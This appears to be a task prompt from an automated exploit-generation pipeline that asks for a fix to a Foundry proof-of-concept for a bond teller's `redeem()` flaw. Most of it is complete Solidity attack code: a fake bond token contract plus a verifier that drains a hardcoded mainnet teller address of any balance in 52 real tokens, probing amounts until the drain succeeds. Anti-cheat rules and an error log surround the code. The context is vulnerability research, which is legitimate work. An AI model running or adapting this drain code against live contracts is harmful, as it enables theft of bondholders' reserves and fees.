You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `redeem()` trusts an arbitrary token contract and can release any ERC20 held by the teller
- claim: `redeem()` never verifies that `token_` is a bond token deployed by this teller. It blindly calls the caller-supplied contract for `expiry()`, `burn(address,uint256)`, and `underlying()`, then transfers `amount_` of whatever ERC20 `underlying()` returns from the teller to the caller.
- impact: Any ERC20 balance currently held by the teller can be drained permissionlessly, including payout reserves backing live bonds, tokens deposited through `create()`, and accrued fee balances.
- exploit_paths: ["Deploy a malicious contract exposing `expiry()`, `burn(address,uint256)`, and `underlying()` with the expected ABI.", "Make `expiry()` return a timestamp in the past, `burn()` a no-op, and `underlying()` return a valuable ERC20 held by the teller.", "Call `redeem(maliciousToken, amount)`.", "The teller accepts the fake token, skips any real burn accounting, and transfers out `amount` of the chosen ERC20."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IBondFixedExpiryTellerMinimal {
    function redeem(address token_, uint256 amount_) external;
}

contract MaliciousBondToken {
    address private _selectedUnderlying;

    constructor() {}

    function setUnderlying(address underlying_) external {
        _selectedUnderlying = underlying_;
    }

    function underlying() external view returns (address) {
        return _selectedUnderlying;
    }

    function expiry() external pure returns (uint48) {
        return 1;
    }

    function burn(address, uint256) external pure {}
}

contract FlawVerifier {
    address public constant TELLER = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) return;
        _executed = true;

        address[] memory candidates = _candidateTokens();

        // Exploit path 0:
        // Deploy a malicious contract exposing expiry(), burn(address,uint256), and underlying().
        MaliciousBondToken maliciousToken = new MaliciousBondToken();

        for (uint256 i = 0; i < candidates.length; ++i) {
            address candidate = candidates[i];
            (uint256 tellerBalance, bool ok) = _safeBalanceOf(candidate, TELLER);
            if (!ok || tellerBalance == 0) continue;

            // Exploit path 1:
            // Make expiry() return a past timestamp, burn() a no-op, and underlying()
            // return a valuable ERC20 already held by the teller.
            maliciousToken.setUnderlying(candidate);

            if (_attemptRedeem(address(maliciousToken), candidate, tellerBalance)) {
                return;
            }

            if (_probeRedeem(address(maliciousToken), candidate, tellerBalance)) {
                return;
            }
        }

        revert("NO_PROFIT_REALIZED");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptRedeem(address maliciousToken, address candidate, uint256 amount)
        internal
        returns (bool)
    {
        (uint256 beforeBalance, bool beforeOk) = _safeBalanceOf(candidate, address(this));
        if (!beforeOk) return false;

        // Exploit path 2:
        // Call redeem(maliciousToken, amount). This is the vulnerable trust boundary:
        // the teller never verifies token_ is a genuine teller-deployed bond token.
        try IBondFixedExpiryTellerMinimal(TELLER).redeem(maliciousToken, amount) {
            (uint256 afterBalance, bool afterOk) = _safeBalanceOf(candidate, address(this));
            if (afterOk && afterBalance > beforeBalance) {
                // Exploit path 3:
                // The teller accepts the fake token, skips real burn accounting,
                // and transfers out the chosen existing ERC20 as profit.
                _profitToken = candidate;
                _profitAmount = afterBalance - beforeBalance;
                return true;
            }
        } catch {}

        return false;
    }

    function _probeRedeem(address maliciousToken, address candidate, uint256 observedBalance)
        internal
        returns (bool)
    {
        uint256[12] memory probes = [
            observedBalance / 2,
            observedBalance / 3,
            observedBalance / 4,
            observedBalance / 8,
            observedBalance / 16,
            observedBalance / 32,
            1e24,
            1e21,
            1e18,
            1e15,
            1e12,
            1
        ];

        for (uint256 i = 0; i < probes.length; ++i) {
            uint256 amount = probes[i];
            if (amount == 0 || amount >= observedBalance) continue;
            if (_attemptRedeem(maliciousToken, candidate, amount)) {
                return true;
            }
        }

        return false;
    }

    function _candidateTokens() internal pure returns (address[] memory candidates) {
        candidates = new address[](52);

        candidates[0] = 0x64aA3364f17d0F855A640887a4EDA1dDDCF97aa7;
        candidates[1] = 0x383518188C0C6d7730D91b2c03a03C837814a899;
        candidates[2] = 0x0ab87046fBb341D058F17CBC4c1133F25a20a52f;
        candidates[3] = 0x04F2694C8fcee23e8Fd0dfEA1d4f5Bb8c352111F;
        candidates[4] = 0xCa76543Cf381ebBB277bE79574059e32108e3E65;
        candidates[5] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        candidates[6] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        candidates[7] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        candidates[8] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
        candidates[9] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
        candidates[10] = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
        candidates[11] = 0x99d8a9c45B2eCbe86FAFddE8B56BfFFE5D8fe9e8;
        candidates[12] = 0x03ab458634910AaD20eF5f1C8ee96F1D6ac54919;
        candidates[13] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        candidates[14] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        candidates[15] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        candidates[16] = 0x7F39C581f595B53c5cB5aFfb3DBF8dA6c935E2cA;
        candidates[17] = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
        candidates[18] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        candidates[19] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
        candidates[20] = 0x1509706a6c66CA549ff0cB464de88231DDBe213B;
        candidates[21] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
        candidates[22] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
        candidates[23] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
        candidates[24] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        candidates[25] = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
        candidates[26] = 0xba100000625a3754423978a60c9317c58a424e3D;
        candidates[27] = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        candidates[28] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        candidates[29] = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
        candidates[30] = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
        candidates[31] = 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D;
        candidates[32] = 0xdBdb4d16EdA451D0503b854CF79D55697F90c8DF;
        candidates[33] = 0x090185f2135308BaD17527004364eBcC2D37e5F6;
        candidates[34] = 0x2e9d63788249371f1DFC918a52f8d799F4a38C94;
        candidates[35] = 0x1494CA1F11D487c2bBe4543E90080AeBa4BA3C2b;
        candidates[36] = 0x111111111117dC0aa78b770fA6A738034120C302;
        candidates[37] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
        candidates[38] = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
        candidates[39] = 0x408e41876cCCDC0F92210600ef50372656052a38;
        candidates[40] = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
        candidates[41] = 0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359;
        candidates[42] = 0x6810e776880C02933D47DB1b9fc05908e5386b96;
        candidates[43] = 0x221657776846890989a759BA2973e427DfF5C9bB;
        candidates[44] = 0x92D6C1e31e14520e676a687F0a93788B716BEff5;
        candidates[45] = 0x3A283D9c08E8b55966afb64C515f5143cf907611;
        candidates[46] = 0x3472A5A71965499acd81997a54BBA8D852C6E53d;
        candidates[47] = 0x68749665FF8D2d112Fa859AA293F07A622782F38;
        candidates[48] = 0xD417144312DbF50465b1C641d016962017Ef6240;
        candidates[49] = 0x25F8087Ea8fa962956c8077C8DeBECe9c409e894;
        candidates[50] = 0x8762db106B2c2A0bccB3A80d1Ed41273552616E8;
        candidates[51] = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
    }

    function _safeBalanceOf(address token, address account)
        internal
        view
        returns (uint256 balance, bool ok)
    {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account)
        );
        if (!success || data.length < 32) {
            return (0, false);
        }
        return (abi.decode(data, (uint256)), true);
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code deploys custom token contracts; synthetic profit tokens are forbidden
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
